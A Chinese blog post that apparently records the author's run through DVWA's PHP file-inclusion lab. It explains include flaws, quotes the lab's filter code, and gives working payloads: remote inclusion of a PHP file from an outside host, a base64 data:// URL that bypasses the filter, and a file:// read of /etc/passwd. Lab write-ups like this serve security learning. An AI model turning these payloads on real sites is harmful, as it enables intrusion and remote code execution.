<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-文件包含</title><meta content=DVWA上手记录-文件包含 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=DVWA上手记录-文件包含 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/ property=twitter:url><meta content=DVWA上手记录-文件包含 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-文件包含</h1><p class=author-line>作于：2022-04-26 15:07 ，预计阅读时间 8 分钟<article><h2 id=qian-yan>前言</h2><p>这次玩一下 DVWA 的文件包含。<h2 id=yuan-li>原理</h2><h3 id=phphe-include>PHP和include</h3><p>在 php 语言中 <code>include</code> 表达式用于包含指定的文件，写过 C/C++ 应该对 <code>#include</code> 预处理指令比较熟，php 的 <code>include</code> 表达式和 <code>#include</code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 <code>#include</code> 预处理器比较像。<p>然后，因为 <code>include</code> 可以写做表达式的缘故，在 php 里可以 <code>include $file</code>，如果把用户传入的数据未经过检查就交给 <code>include</code> 的话就可能产生一个文件包含漏洞。<blockquote><p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在<a href=https://www.php.net/manual/zh/language.basic-syntax.phpmode.php>有效的 PHP 起始和结束标记</a>之中。</blockquote><p>解释器的这个行为进一步拓宽了可利用的范围。<blockquote><p>如果“<a href=https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include>URL include wrappers</a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见<a href=https://www.php.net/manual/zh/wrappers.php>支持的协议和封装协议</a>）而不是本地文件来指定要被包含的文件。</blockquote><p>对 <code>include</code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。<h3 id=ben-di-wen-jian-bao-han>本地文件包含</h3><p>本地文件包含一般可以是 <code>include "some/folder/" . $_GET["file"] . ".php"</code> 或类似的形式，此时可以通过 <code>file=../../malicious</code> 这样的 payload 来包含任意代码。<h3 id=yuan-cheng-wen-jian-bao-han>远程文件包含</h3><p>此时对 <code>include</code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 <code>zlib://</code> 之类的协议直接把要执行的代码放在 payload 里。<h2 id=wen-jian-bao-han>文件包含</h2><h3 id=xin-xi-shou-ji>信息收集</h3><p><img alt=image-20220426140326609 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426140326609.webp><p>页面没有什么特别的，点击上面的 <code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 能分别看到三个不同的子页面：<p><img alt=image-20220426140433312 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426140433312.webp><p><img alt=image-20220426140441863 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426140441863.webp><p><img alt=image-20220426140450138 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426140450138.webp><p>注意地址栏会发现有意思的地方：<ul><li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php<li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php<li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php<li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php</ul><p>很直接地想到 <code>index.php</code>、<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code>就是被包含的文件了。尝试提交一个 <code>page=file4.php</code>，发现彩蛋。<p><img alt=image-20220426140828383 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426140828383.webp><p>直接观察 dvwa 源码，可以发现 <code>include</code> 出现的位置是 <code>dvwa/vulnerabilities/fi/index.php</code> 里，<code>php.ini</code> 配置的 <code>include_path</code> 应该是包含当前目录 <code>.</code> 的，所以可以直接取相对路径包含任意文件。<p>差不多就是这样了。<h3 id=lownan-du>Low难度</h3><p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。<p><img alt=image-20220426141056540 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426141056540.webp><p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 <code>/dev/stdout</code> 和 <code>/dev/stderr</code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。<p>先试一下远程文件包含。<code>python3 -m http.server</code>开个 http 服务器，下面放个 <code>2.php</code>，然后构造 url：<code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php</code><p><img alt=image-20220426142642274 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426142642274.webp><p>成功。<h3 id=ti-gao-nan-du-medium>提高难度：Medium</h3><p>看看 Medium 难度下的代码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// The page we wish to display
</span><span style=color:#fdf4c1>$file </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[ </span><span style=color:#b8bb26>'page' </span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// Input validation
</span><span style=color:#fdf4c1>$file </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>str_replace</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>array</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>"http://"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"https://" </span><span style=color:#fdf4c1>), </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>, $file );
</span><span style=color:#fdf4c1>$file </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>str_replace</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>array</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>"../"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"..\\" </span><span style=color:#fdf4c1>), </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>, $file );
</span><span style=color:#fdf4c1>
</span><span>?>
</span></code></pre><p>用 <code>str_replace</code> 替换掉了 <code>../</code> 和 <code>http://</code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩...<p>改成<code>data://</code>协议，重写一个 payload：<code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=</code>。这段 base64 是 <code> echo '&lt;?php phpinfo(); ?>' | base64</code> 产生的。<p><img alt=image-20220426143248441 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426143248441.webp><p>成功。<h3 id=ti-gao-nan-du-high>提高难度：High</h3><p>High 难度下使用了 <code>fnmatch</code> 匹配文件名，但模式是 <code>file*</code>，所以还是有完蛋的可能。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// The page we wish to display
</span><span style=color:#fdf4c1>$file </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[ </span><span style=color:#b8bb26>'page' </span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// Input validation
</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fe8019>!</span><span style=color:#fabd2f>fnmatch</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>"file*"</span><span style=color:#fdf4c1>, $file ) </span><span style=color:#fe8019>&& </span><span style=color:#fdf4c1>$file </span><span style=color:#fe8019>!= </span><span style=color:#b8bb26>"include.php" </span><span style=color:#fdf4c1>) {
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// This isn't the page we want!
</span><span style=color:#fdf4c1>    </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"ERROR: File not found!"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>exit</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span>?>
</span></code></pre><p>先试一下能不能用<code>file://</code>来 bypass 掉这个模式匹配。<p><img alt=image-20220426143800394 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-04/image-20220426143800394.webp><p>好的，成功 bypass 掉了这个模式，并且包含 <code>/etc/passwd</code> 成功了。不过<code>/etc/shadow</code>就没权限了。<p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。<p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。<h3 id=bang-zhu-wen-dang>帮助文档</h3><p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。<blockquote><p><strong>Objective</strong><p>Read all five famous quotes from '<a href=http://localhost:8080/hackable/flags/fi.php>../hackable/flags/fi.php</a>' using only the file inclusion.</blockquote><p>哦？目标是获取 <code>hackable</code>下的 flag。稍改下 payload 很快就拿到了<code>fi.php</code>的内容。<blockquote><p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don't know.<p>--LINE HIDDEN ;)--<p>4.) The pool on the roof must have a leak.</blockquote><p>这个 <code>LINE HIDDEN</code> 有点怪，不是说 <code>five famous quotes</code> 吗，这只有4条。于是看了眼 <code>fi.php</code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 <code>fi.php</code> 下载下来，不然单纯包含这个文件肯定是不行的。<p>impossible 难度代码长这样：<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>// The page we wish to display
</span><span>$file = $_GET[ 'page' ];
</span><span>
</span><span>// Only allow include.php or file{1..3}.php
</span><span>if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
</span><span>	// This isn't the page we want!
</span><span>	echo "ERROR: File not found!";
</span><span>	exit;
</span><span>}
</span></code></pre><p>硬编码了所有可能的文件，如此一来就没有利用空间了。<h2 id=zong-jie>总结</h2><p>文件包含这题感觉有点emmm<p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。<p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。<p>烦心。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/DVWA/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>